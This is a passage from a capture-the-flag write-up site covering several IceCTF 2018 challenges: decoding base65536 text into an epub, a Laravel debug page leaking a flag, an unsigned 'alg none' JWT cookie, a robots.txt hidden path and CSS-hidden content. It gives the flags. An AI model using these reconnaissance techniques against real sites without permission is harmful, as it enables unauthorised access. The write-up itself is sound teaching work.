</pre></table></code></div></div><p>might be an <code class="language-plaintext highlighter-rouge">.onion</code> link? Opening <code class="language-plaintext highlighter-rouge">http://wsqxiyhn23zdi6ia.onion</code> with a tor browser (or via https://onion.link/) gives:</p><p><a href="writeupfiles/rabbithole.html">rabbithole.html</a></p><p><img src="writeupfiles/rabbithole_screenshot.png" alt="" /></p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE HTML&gt;</span>
<span class="nt">&lt;html&gt;</span>
    <span class="nt">&lt;head&gt;</span>
        <span class="nt">&lt;title&gt;</span>Rabbit Hole<span class="nt">&lt;/title&gt;</span>
	<span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;style&gt;</span>
            <span class="nt">body</span> <span class="p">{</span>
                <span class="nl">background</span><span class="p">:</span> <span class="no">black</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="nt">p</span> <span class="p">{</span>
                <span class="nl">max-width</span><span class="p">:</span> <span class="m">750px</span><span class="p">;</span>
                <span class="nl">text-align</span><span class="p">:</span> <span class="nb">center</span><span class="p">;</span>
                <span class="nl">color</span><span class="p">:</span> <span class="m">#00ff00</span><span class="p">;</span>
                <span class="nl">margin</span><span class="p">:</span> <span class="m">0px</span> <span class="nb">auto</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="nf">#header</span> <span class="p">{</span>
                <span class="nl">max-width</span><span class="p">:</span> <span class="m">989px</span><span class="p">;</span>
                <span class="nl">margin</span><span class="p">:</span> <span class="m">0px</span> <span class="nb">auto</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="nf">#footer</span> <span class="p">{</span>
                <span class="nl">margin</span><span class="p">:</span> <span class="m">100px</span> <span class="m">0</span><span class="p">;</span>
                <span class="nl">text-align</span><span class="p">:</span> <span class="nb">center</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="nf">#error</span> <span class="p">{</span>
                <span class="nl">max-width</span><span class="p">:</span> <span class="m">350px</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="nf">#eyes</span> <span class="p">{</span>
                <span class="nl">max-width</span><span class="p">:</span> <span class="m">200px</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="nt">&lt;/style&gt;</span>
    <span class="nt">&lt;/head&gt;</span>
    <span class="nt">&lt;body&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"header"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;img</span> <span class="na">id=</span><span class="s">"error"</span> <span class="na">src=</span><span class="s">"error.gif"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;p&gt;</span>聐㠃㐊㐀㐀膜舕㐀㐀㐀㐀㐀㐀㐵㐜ꕳ𓅡𔕨𓁯𓅤   [..] <span class="nt">&lt;/p&gt;</span>

         <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"footer"</span><span class="nt">&gt;</span>
             <span class="nt">&lt;img</span> <span class="na">id=</span><span class="s">"eyes"</span> <span class="na">src=</span><span class="s">"eyes.gif"</span><span class="nt">/&gt;</span>
         <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><p><img src="writeupfiles/rabbithole_error.gif" alt="" /> <img src="writeupfiles/rabbithole_eyes.gif" alt="" /></p><p>We find nothing in the images, but after some hints we find that the chinese characters are <a href="https://github.com/Parkayun/base65536">base65536</a></p><p><a href="writeupfiles/rabbithole_characters.txt">file with just the characters</a></p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="c1"># pip install base65536
</span>
<span class="kn">import</span> <span class="n">base65536</span>

<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">rabbithole_characters.txt</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">ct</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">readline</span><span class="p">().</span><span class="nf">rstrip</span><span class="p">().</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">,</span><span class="sh">''</span><span class="p">)</span>

<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">rabbithole_out</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">wb</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f2</span><span class="p">:</span>
    <span class="n">f2</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">base65536</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="n">ct</span><span class="p">))</span>
</pre></table></code></div></div><p>which turns out to be an <a href="writeupfiles/rabbithole_out.epub">epub</a> on cell phone hacking. Searching the contents for the flag gives it to us</p><p><img src="writeupfiles/rabbithole_cover.png" alt="" /> <img src="writeupfiles/rabbithole_flag.png" alt="" /></p><h2 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>IceCTF{if_you_see_this_youve_breached_my_privacy}
</pre></table></code></div></div><h2> Flag</h2><code> IceCTF{if_you_see_this_youve_breached_my_privacy} </code><hr><h1 id="friðfinnur"> Friðfinnur <a href="/CTF-writeups-public/writeups/IceCTF-2018/web-200-fri%C3%B0finnur.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Eve wants to make the hottest new website for job searching on the market! An avid PHP developer she decided to use the hottest new framework, Laravel! I don’t think she knew how to deploy websites at this scale however….</p><p>https://gg4ugw5xbsr2myw-fridfinnur.labs.icec.tf/</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Not sure if this was the intended solution, but requesting an url for a nonexistant job listing lead to an error message containing the flag:</p><p>https://29nd70ux6kr7ala-fridfinnur.labs.icec.tf/jobs/galaxian</p><p><img src="writeupfiles/errorpagewithflag.png" alt="" /></p><h2 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>IceCTF{you_found_debug}
</pre></table></code></div></div><h2> Flag</h2><code> IceCTF{you_found_debug} </code><hr><h1 id="history-of-computing"> History of Computing <a href="/CTF-writeups-public/writeups/IceCTF-2018/web-350-history-of-computing.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>One of the authors of IceCTF made this page but I don’t think it’s very accurate. Can you take hack it before the IceCTF team gets sued?</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>A blogging website with registration/login forms and comment submission</p><p><img src="writeupfiles/historyofcomputing_screenshot.png" alt="" /></p><p>If we log in we get a cookie</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>token:   eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6InRlc3R1c2VyIiwiZmxhZyI6IkljZUNURntob3BlIHlvdSBkb24ndCB0aGluayB0aGlzIGlzIGEgcmVhbCBmbGFnfSJ9.
session: eyJ1c2VyIjozfQ.DnrHzA.T60QwnNSuvq2HH0VSnNqqzFZ-24
</pre></table></code></div></div><p>which base64 decode to:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>token: {"typ":"JWT","alg":"none"}.{"username":"testuser","flag":"IceCTF{hope you don't think this is a real flag}"}
session: {"user":3}.?.?
</pre></table></code></div></div><h2 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> unsolved </code><hr><h1 id="toke-relaunch"> Toke Relaunch <a href="/CTF-writeups-public/writeups/IceCTF-2018/web-50-toke-relaunch.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We’ve relaunched our famous website, Toke! Hopefully no one will hack it again and take it down like the last time.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The link leads to some marijuna website</p><p><img src="writeupfiles/toke_screenshot.jpg" alt="" /></p><p>Last edition the toke challenge had the flag hidden in a cookie, but no cookies are set this time, so we have to look elsewhere</p><p>We check the robots.txt file and see:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>User-agent: *
Disallow: /secret_xhrznylhiubjcdfpzfvejlnth.html
</pre></table></code></div></div><p>the disallowed file contains our flag.</p><h2 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>IceCTF{what_are_these_robots_doing_here}
</pre></table></code></div></div><h2> Flag</h2><code> IceCTF{what_are_these_robots_doing_here} </code><hr><h1 id="ligths-out"> Ligths out <a href="/CTF-writeups-public/writeups/IceCTF-2018/web-75-ligths-out.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Help! We’re scared of the dark!</p><p>https://static.icec.tf/lights_out</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We see a black page</p><p><img src="writeupfiles/lights_out_screenshot_before.png" alt="" /></p><p>with source:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="cp">&lt;!doctype html&gt;</span>
<span class="nt">&lt;html&gt;</span>
    <span class="nt">&lt;head&gt;</span>
        <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"utf-8"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;title&gt;</span>Lights out!<span class="nt">&lt;/title&gt;</span>
        <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"main.css"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/head&gt;</span>
    <span class="nt">&lt;body&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"alert alert-danger"</span><span class="nt">&gt;</span>Who turned out the lights?!?!<span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;summary&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"clearfix"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;i</span> <span class="na">data-hide=</span><span class="s">"true"</span><span class="nt">&gt;&lt;/i&gt;</span>
            <span class="nt">&lt;strong</span> <span class="na">data-show=</span><span class="s">"true"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;small&gt;&lt;/small&gt;</span>
            <span class="nt">&lt;/strong&gt;</span>
            <span class="nt">&lt;small&gt;&lt;/small&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/summary&gt;</span>
    <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><p>Some fiddling with the css yields the flag</p><p><img src="writeupfiles/lights_out_screenshot.png" alt="" /></p><h2 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>IceCTF{styles_turned_the_lights}
</pre></table></code></div></div><h2> Flag</h2><code> IceCTF{styles_turned_the_lights} </code><hr></div><script> document.addEventListener("DOMContentLoaded", () => { console.log("Hello World!"); tocbot.init({ tocSelector: '#toc', contentSelector: '.post-content', ignoreSelector: '[data-toc-skip]', headingSelector: 'h1', orderedList: false, scrollSmooth: false, }); }); </script></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div class="panel-heading"> <a href="https://github.com/shiltemann/CTF-writeups-public/tree/main/website/writeups/IceCTF-2018/index.md"><i class="fab fa-github"></i> Edit on GitHub </a></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc"></nav></div><script src="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.js"></script></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/CTF-writeups-public/tag/image/">image</a> <a class="post-tag" href="/CTF-writeups-public/tag/rsa/">RSA</a> <a class="post-tag" href="/CTF-writeups-public/tag/lsb/">LSB</a> <a class="post-tag" href="/CTF-writeups-public/tag/cipher/">cipher</a> <a class="post-tag" href="/CTF-writeups-public/tag/pcap/">pcap</a> <a class="post-tag" href="/CTF-writeups-public/tag/audio/">audio</a> <a class="post-tag" href="/CTF-writeups-public/tag/aws/">aws</a> <a class="post-tag" href="/CTF-writeups-public/tag/bash/">bash</a> <a class="post-tag" href="/CTF-writeups-public/tag/binwalk/">binwalk</a> <a class="post-tag" href="/CTF-writeups-public/tag/crib-dragging/">crib dragging</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://github.com/shiltemann">Team Galaxians</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0">Using the <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> theme <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>.</p></div></div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false" ><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/CTF-writeups-public/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5"></p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script defer src="/CTF-writeups-public/assets/js/dist/commons.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/CTF-writeups-public/app.js"></script>
